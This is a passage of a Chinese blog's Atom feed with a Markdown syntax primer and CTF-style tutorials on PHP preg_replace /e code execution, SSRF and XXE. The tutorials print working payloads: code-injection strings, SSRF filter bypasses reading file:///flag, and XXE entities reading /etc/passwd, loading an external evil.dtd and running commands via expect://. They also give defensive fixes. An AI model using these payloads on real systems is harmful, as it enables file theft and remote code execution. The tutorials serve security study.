    <content type="html"><![CDATA[<p>因为我在使用 Github pages写博客的时候需要使用Markdown编辑工具编辑文章，我对于Markdown的语法也从一无所知慢慢熟悉起来。今天来总结一下我平时常用的Markdown语法</p><h3 id="Markdown简介"><a href="#Markdown简介" class="headerlink" title="Markdown简介"></a>Markdown简介</h3><p>Markdown是一种轻量级标记语言，创始人为约翰·格鲁伯（英语：John Gruber）。它允许人们“使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML（或者HTML）文档”。[4]这种语言吸收了很多在电子邮件中已有的纯文本标记的特性。</p><p>由于Markdown的轻量化、易读易写特性，并且对于图片，图表、数学式都有支持，当前许多网站都广泛使用 Markdown 来撰写帮助文档或是用于论坛上发表消息。例如：GitHub、reddit、Diaspora、Stack Exchange、OpenStreetMap 、SourceForge等。甚至Markdown能被使用来撰写电子书<br>（来源：Wikipedia)</p><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在代码的开始和结束使用``` ``` 来包含多行代码</span><br></pre></td></tr></table></figure><h3 id="图片引用"><a href="#图片引用" class="headerlink" title="图片引用"></a>图片引用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">![图片说明](图片地址)</span><br><span class="line">或</span><br><span class="line">&lt;img src=&quot;https://xxx&quot; alt=&quot;&quot; title=&quot;&quot; width=&quot;50&quot; height=&quot;50&quot; /&gt;</span><br></pre></td></tr></table></figure><h3 id="粗体与斜体"><a href="#粗体与斜体" class="headerlink" title="粗体与斜体"></a>粗体与斜体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 ** ** 或 __ __ 包括的文本会加粗</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 * * 或 _ _ 包括的文本会转换为斜体</span><br></pre></td></tr></table></figure><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;引用内容</span><br><span class="line">&gt;&gt;使用嵌套引用</span><br></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+或-</span><br></pre></td></tr></table></figure><h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">***</span><br><span class="line">------</span><br><span class="line">___</span><br></pre></td></tr></table></figure><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;因为我在使用 Github pages写博客的时候需要使用Markdown编辑工具编辑文章，我对于Markdown的语法也从一无所知慢慢熟悉起来。今天来总结一下我平时常用的Markdown语法&lt;/p&gt;
&lt;h3 id=&quot;Markdown简介&quot;&gt;&lt;a href=&quot;#Markdo
      
    
    </summary>
    
    
      <category term="标记语言" scheme="https://kevens10.github.io/categories/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="Markdown" scheme="https://kevens10.github.io/tags/Markdown/"/>
    
      <category term="标记语言" scheme="https://kevens10.github.io/tags/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>preg_replace()代码执行漏洞</title>
    <link href="https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html"/>
    <id>https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</id>
    <published>2019-11-15T12:08:51.000Z</published>
    <updated>2019-11-16T03:41:40.821Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-关于preg-replace-函数"><a href="#0x00-关于preg-replace-函数" class="headerlink" title="0x00 关于preg_replace()函数"></a>0x00 关于preg_replace()函数</h2><p>preg_replace：(PHP 5.5)</p><p>功能 ： 函数执行一个正则表达式的搜索和替换</p><p>定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</p><p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。<br>参数说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line"></span><br><span class="line">$replacement: 用于替换的字符串或字符串数组。</span><br><span class="line"></span><br><span class="line">$subject: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line"></span><br><span class="line">$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span><br><span class="line"></span><br><span class="line">$count: 可选，为替换执行的次数。</span><br></pre></td></tr></table></figure><h2 id="0x01-漏洞的产生"><a href="#0x01-漏洞的产生" class="headerlink" title="0x01 漏洞的产生"></a>0x01 漏洞的产生</h2><p>$pattern 存在 /e 模式修正符，允许代码执行</p><p>/e 模式修正符，是 *<em>preg_replace() *</em> 导致 $replacement 部分当做php代码来执行。</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo preg_replace(&apos;/test/e&apos;,$_GET[&apos;r&apos;],&apos;atest&apos;)</span><br></pre></td></tr></table></figure><p>这个preg_replace函数的意思为，将第一个参数匹配到的内容替换为第二个参数，操作的目标字符串是第三个参数</p><p>以上述代码为例，若没有/e，则代码的功能为将 atest中的test换为<code>$_GET[&quot;r&quot;]</code></p><p><strong>当使用/e参数时，代码的功能为将atest中的test换为$_GET[“h”]的执行结果，当$_GET[‘r’]为phpinfo()时就直接执行了</strong></p><p>构造： <code>?r=phpinfo()</code>，成功获得phpinfo<br><img src="/images/pregreplace1.png" alt></p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;? php function getpages()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">echo preg_replace(&quot;/123(.*)123/ies&quot;,&apos; getpages(&quot;\1&quot;)&apos;,$_GETI&quot;pages&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload:<code>?pages=123{${phpinfo}}</code><br><img src="/images/pregreplace2.png" alt></p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;? </span><br><span class="line">function test($str) &#123; &#125; </span><br><span class="line">echo preg_replace(&quot;/prefix(.+?)suffix/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $_GET[&quot;h&quot;]);</span><br></pre></td></tr></table></figure><p>/i 表示不区分大小写</p><p>/s 表示正则中的.匹配所有字符，包括换行</p><p>解释一下代码的意思，如果输入的$_GET[“h”]为aaaprefixphpinfo()suffix</p><p>首先使用第一个参数匹配第三个参数，匹配到的部分替换为第二个参数执行的结果，第二个参数中的\1为第一个参数中的(.+?)匹配到的内容</p><p>所以会执行<code>test(&quot;phpinfo()&quot;)</code></p><p>当<code>$_GET[&quot;h&quot;]</code>为<code>prefix${phpinfo()}suffix</code>时就会执行<code>test(&quot;${phpinfo()}&quot;)</code>，因为双引号的缘故，<code>phpinfo</code>得以执行</p><h2 id="0x02-避免"><a href="#0x02-避免" class="headerlink" title="0x02 避免"></a>0x02 避免</h2><p>preg_replace /e修饰符在PHP5.5.0起废弃</p><p><strong>官方推荐使用preg_replace_callback()代替/e</strong></p><p>php7.0.0 起不再支持/e</p><p>preg_replace_callback：<br>执行一个正则表达式搜索并且使用一个回调进行替换</p><p>说明<br>preg_replace_callback ( mixed $pattern , callable $callback , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed<br>这个函数的行为除了 可以指定一个 callback 替代 replacement 进行替换 字符串的计算，其他方面等同于 preg_replace()。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-关于preg-replace-函数&quot;&gt;&lt;a href=&quot;#0x00-关于preg-replace-函数&quot; class=&quot;headerlink&quot; title=&quot;0x00 关于preg_replace()函数&quot;&gt;&lt;/a&gt;0x00 关于preg_replace
      
    
    </summary>
    
    
      <category term="Web安全" scheme="https://kevens10.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF Web" scheme="https://kevens10.github.io/tags/CTF-Web/"/>
    
      <category term="PHP" scheme="https://kevens10.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="https://kevens10.github.io/articles/SSRF%E6%BC%8F%E6%B4%9E.html"/>
    <id>https://kevens10.github.io/articles/SSRF%E6%BC%8F%E6%B4%9E.html</id>
    <published>2019-11-11T12:08:51.000Z</published>
    <updated>2019-11-11T06:37:16.881Z</updated>
    
    <content type="html"><![CDATA[<p>SSRF 即Server-Side Request Forgery<br>服务器端请求伪造攻击，利用漏洞伪造服务器端发起请求，从而突破客户端获取本身得不到的数据，SSRF攻击的目标是从外网无法访问的内部系统。</p><p>SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。</p><p>假设A网站是一个所有人都可以访问的外网网站，B网站是一个他们内部的网站，普通用户只能访问A网站，不能访问B网站，但是我们可以通过A网站做中间人，伪造身份发送请求，就可以访问B网站，近而达到攻击B网站的目的。<br><a href="http://www.shiyanbar.com/xxx.php?image=www.abc.com/.jpg" target="_blank" rel="noopener">www.shiyanbar.com/xxx.php?image=www.abc.com/.jpg</a> 获取a网站一个图片<br>那么这里如果服务器端没有对请求获取图片的参数 image 做出严格限制和过滤，那么它就有可能导致获取其它服务器数据<br><a href="http://www.shiyanbar.com/xxx.php?image=XXX" target="_blank" rel="noopener">www.shiyanbar.com/xxx.php?image=XXX</a>  //XXX为利用方法</p><h3 id="可能出现的地方"><a href="#可能出现的地方" class="headerlink" title="可能出现的地方"></a>可能出现的地方</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line">2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line">3.在线翻译：给网址翻译对应网页的内容</span><br><span class="line">4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line">5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</span><br><span class="line">6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</span><br><span class="line">7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line">8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</span><br><span class="line">9.邮件系统：比如接收邮件服务器地址</span><br><span class="line">10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</span><br><span class="line">11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</span><br><span class="line">一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</span><br><span class="line">12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</span><br></pre></td></tr></table></figure><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>1、更改IP地址写法<br>因为可能通过过滤掉内网IP的方式。<br>可以通过进制绕过：<br>192.168.0.1的各种进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1)、8进制格式：0300.0250.0.1</span><br><span class="line"></span><br><span class="line">(2)、16进制格式：0xC0.0xA8.0.1</span><br><span class="line"></span><br><span class="line">(3)、10进制整数格式：3232235521</span><br><span class="line"></span><br><span class="line">(4)、16进制整数格式：0xC0A80001</span><br></pre></td></tr></table></figure><p>2、利用解析URL所出现的问题<br>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。<br><a href="http://www.baidu.com@192.168.0.1/" target="_blank" rel="noopener">http://www.baidu.com@192.168.0.1/</a><br>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<a href="http://www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。" target="_blank" rel="noopener">www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</a><br>3、URL跳转绕过：<a href="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/" target="_blank" rel="noopener">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</a><br>4、利用302跳转<br>xip.io来绕过：<a href="http://xxx.192.168.0.1.xip.io/" target="_blank" rel="noopener">http://xxx.192.168.0.1.xip.io/</a> == 192.168.0.1 (xxx 任意）<br>指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)<br>192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="easygallery-1"><a href="#easygallery-1" class="headerlink" title="easygallery-1"></a>easygallery-1</h4><p>查看源码，发现“flag”:  <?php $flag='flag in the /flag';?><br>接着在下面发现链接：<br><a href="http://xxxx/gallery.php?path=http://127.0.0.1:8082/gallery/static/img/portfolio-1.jpg" target="_blank" rel="noopener">http://xxxx/gallery.php?path=http://127.0.0.1:8082/gallery/static/img/portfolio-1.jpg</a></p><p>SSRF利用，直接payload拿试试：<br><a href="http://xxxx/gallery.php?path=file:///flag" target="_blank" rel="noopener">http://xxxx/gallery.php?path=file:///flag</a></p><p>发现为空，这里忽略了一个点：<br>题目应该是限制了后缀jpg,尝试绕过，这里用到一个点，即%23或？，HTML中起连接作用，而且不影响读取文件</p><p>最终payload:<br><a href="http://xxxx/gallery.php?path=file:///flag%23.jpg" target="_blank" rel="noopener">http://xxxx/gallery.php?path=file:///flag%23.jpg</a></p><h4 id="easygallery-2"><a href="#easygallery-2" class="headerlink" title="easygallery-2"></a>easygallery-2</h4><p>与1基本类似，但是再次用原来payload会发现报错：scheme error!<br>猜测后端禁用了file协议。。。</p><p>抓包发现是POST方式，猜测是命令执行<br>最终payload:<br><a href="http://xxxx/download.php?f=http://127.0.0.1/download.php" target="_blank" rel="noopener">http://xxxx/download.php?f=http://127.0.0.1/download.php</a> file:///flag 1.jpg</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.禁止跳转</p><p>2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p><p>4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p><p>5.限制请求的端口为http常用的端口，比如 80、443、8080、8090</p><p>6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>参考资料：<a href="https://www.freebuf.com/articles/web/135342.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135342.html</a><br><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;SSRF 即Server-Side Request Forgery&lt;br&gt;服务器端请求伪造攻击，利用漏洞伪造服务器端发起请求，从而突破客户端获取本身得不到的数据，SSRF攻击的目标是从外网无法访问的内部系统。&lt;/p&gt;
&lt;p&gt;SSRF漏洞形成的原因主要是服务器端所提供的接口中
      
    
    </summary>
    
    
      <category term="Web安全" scheme="https://kevens10.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF Web" scheme="https://kevens10.github.io/tags/CTF-Web/"/>
    
      <category term="SSRF" scheme="https://kevens10.github.io/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="https://kevens10.github.io/articles/XXE%E6%BC%8F%E6%B4%9E.html"/>
    <id>https://kevens10.github.io/articles/XXE%E6%BC%8F%E6%B4%9E.html</id>
    <published>2019-11-10T12:08:51.000Z</published>
    <updated>2019-11-11T03:21:15.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-XML基础"><a href="#0x00-XML基础" class="headerlink" title="0x00 XML基础"></a>0x00 XML基础</h2><p>可扩展标记语言（英語：Extensible Markup Language，简称：XML）是一种标记语言。 标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。</p><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。如图所示：<br><img src="/images/xxe1.png" alt></p><p>xxe漏洞与DTD文档相关。</p><h4 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h4><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。<br>内部声明DTD:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>引用外部DTD:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD文档中重要的关键字如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DOCTYPE（DTD的声明）</span><br><span class="line">ENTITY（实体的声明）</span><br><span class="line">SYSTEM、PUBLIC（外部资源申请）</span><br></pre></td></tr></table></figure><h5 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h5><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><p>内置实体 (Built-in entities)<br>字符实体 (Character entities)<br>通用实体 (General entities)<br>参数实体 (Parameter entities)<br>实体根据引用方式，还可分为内部实体与外部实体。</p><h5 id="实体类别"><a href="#实体类别" class="headerlink" title="实体类别"></a>实体类别</h5><p>内部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部实体:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>参数实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。<br><strong>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</strong><br>实例演示：除参数实体外实体+内部实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY name &quot;sz&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;name;&lt;/value&gt; </span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>实例演示：参数实体+外部实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。<br>实例：外部实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;content;&lt;/value&gt; </span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p><strong>xxe漏洞主要是利用了DTD引用外部实体导致的漏洞</strong></p><h2 id="0x01-XXE漏洞介绍"><a href="#0x01-XXE漏洞介绍" class="headerlink" title="0x01 XXE漏洞介绍"></a>0x01 XXE漏洞介绍</h2><p>XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，<strong>允许引用外部实体</strong>，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。xxe漏洞触发的点往往是可以<strong>上传xml文件的位置</strong>，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h3 id="XXE漏洞检测"><a href="#XXE漏洞检测" class="headerlink" title="XXE漏洞检测"></a>XXE漏洞检测</h3><p>先检测是否解析XML</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE hello [  </span><br><span class="line">&lt;!ENTITY name &quot;Hello,hacker!&quot;&gt;]&gt;    </span><br><span class="line">&lt;root&gt;&amp;name;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>如果页面输出了Hello,hacker!，说明xml文件可以被解析。<br>然后检测服务器是否支持DTD引用外部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;  </span><br><span class="line">&lt;!DOCTYPE test [  </span><br><span class="line">&lt;!ENTITY % name SYSTEM &quot;http://localhost/index.html&quot;&gt;  </span><br><span class="line">%name;  </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>可通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求。</p><h2 id="0x02-XML外部实体注入（漏洞利用）"><a href="#0x02-XML外部实体注入（漏洞利用）" class="headerlink" title="0x02 XML外部实体注入（漏洞利用）"></a>0x02 XML外部实体注入（漏洞利用）</h2><h4 id="恶意引入外部实体1（读取文件）"><a href="#恶意引入外部实体1（读取文件）" class="headerlink" title="恶意引入外部实体1（读取文件）"></a>恶意引入外部实体1（读取文件）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;? xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;! DOCTYPE a[</span><br><span class="line">&lt;! ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c〉&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><h4 id="恶意引入外部实体2（读取文件）"><a href="#恶意引入外部实体2（读取文件）" class="headerlink" title="恶意引入外部实体2（读取文件）"></a>恶意引入外部实体2（读取文件）</h4><p>XML内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;? xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;! DOCTYPE a[</span><br><span class="line">&lt;! ENTITY % d SYSTEM &quot;http://xxx. com/evil. dtd&quot;&gt;</span><br><span class="line">%d;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><p>DTD文件(evil.dtd)内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="恶意引入外部实体3（读取文件）"><a href="#恶意引入外部实体3（读取文件）" class="headerlink" title="恶意引入外部实体3（读取文件）"></a>恶意引入外部实体3（读取文件）</h4><p>XML内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;? xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;! DOCTYPE a SYSTEM&quot;http://xxx. com/evil. dtd&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD文件(evil.dtd)内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;? xmL version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;! DOCTYPE ANY[</span><br><span class="line">&lt;! ENTITY xxe SYSTEM&quot;expect://id&quot;&gt;</span><br><span class="line">&lt;x&gt;&amp; xxe;&lt;/x&gt;</span><br><span class="line">EOF; </span><br><span class="line">$data=simplexml_load_string($xml); </span><br><span class="line">print_r($data);</span><br></pre></td></tr></table></figure><h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 